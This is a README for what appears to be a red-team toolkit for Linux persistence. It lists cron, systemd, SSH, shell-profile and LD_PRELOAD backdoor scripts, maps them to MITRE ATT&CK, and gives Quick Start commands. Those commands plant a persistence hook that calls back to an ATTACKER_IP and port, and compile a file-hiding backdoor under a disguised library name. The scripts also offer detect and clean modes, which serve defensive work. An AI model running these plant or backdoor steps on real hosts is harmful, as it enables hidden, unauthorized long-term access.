# Linux Persistence

Techniques to maintain access after initial compromise.

## Files

| File | Description |
|------|-------------|
| [`cron_persistence.sh`](cron_persistence.sh) | Cron-based persistence — user crontab, system crontab, /etc/cron.d/, anacron, at jobs. Plant, detect, and clean modes |
| [`systemd_persistence.sh`](systemd_persistence.sh) | Systemd persistence — user services, system services, timers, socket activation. Includes reverse shell templates |
| [`ssh_persistence.sh`](ssh_persistence.sh) | SSH persistence — authorized_keys, config backdoor, SSHD wrapper, MOTD backdoor, PAM module, alternate port |
| [`ld_preload_backdoor.c`](ld_preload_backdoor.c) | LD_PRELOAD shared library — hooks readdir/stat/access to hide files/processes, magic GID root shell trigger |
| [`bashrc_persistence.sh`](bashrc_persistence.sh) | Shell profile persistence — .bashrc, .profile, /etc/profile.d/, PROMPT_COMMAND, bash completion, alias hijacking |

## MITRE ATT&CK References

| Technique | ID | Script |
|-----------|----|--------|
| Scheduled Task/Job: Cron | T1053.003 | `cron_persistence.sh` |
| Create/Modify System Process: Systemd | T1543.002 | `systemd_persistence.sh` |
| Account Manipulation: SSH Authorized Keys | T1098.004 | `ssh_persistence.sh` |
| Hijack Execution Flow: LD_PRELOAD | T1574.006 | `ld_preload_backdoor.c` |
| Event Triggered Execution: Shell Config | T1546.004 | `bashrc_persistence.sh` |

## Quick Start

```bash
# All scripts support --plant, --detect, and --clean modes
export ATTACKER_IP=10.10.14.1
export ATTACKER_PORT=4444

# Plant cron persistence
./cron_persistence.sh --plant --ip $ATTACKER_IP --port $ATTACKER_PORT

# Detect all persistence on a compromised host
./cron_persistence.sh --detect
./systemd_persistence.sh --detect
./ssh_persistence.sh --detect
./bashrc_persistence.sh --detect

# Compile LD_PRELOAD backdoor
gcc -fPIC -shared -o libprocessor.so ld_preload_backdoor.c -ldl -D_GNU_SOURCE
```
